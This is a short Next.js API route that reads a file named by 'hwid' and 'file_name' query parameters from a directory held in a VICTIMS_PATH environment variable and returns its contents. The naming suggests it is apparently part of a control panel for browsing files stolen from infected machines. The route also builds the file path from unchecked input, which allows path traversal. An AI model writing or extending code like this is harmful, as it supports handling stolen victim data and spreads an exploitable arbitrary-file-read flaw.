// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'
import fs from 'fs';

type Data = {
  file_content: string
}

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  const { hwid, file_name } = req.query;
  if (!hwid || !file_name) {
    res.status(400).end();
    return;
  }
  const file_content = fs.readFileSync(process.env.VICTIMS_PATH + hwid + '/' + file_name);
    /* files.forEach(file => { */
    /* }); */
  res.status(200).json({ file_content : file_content.toString() });
}
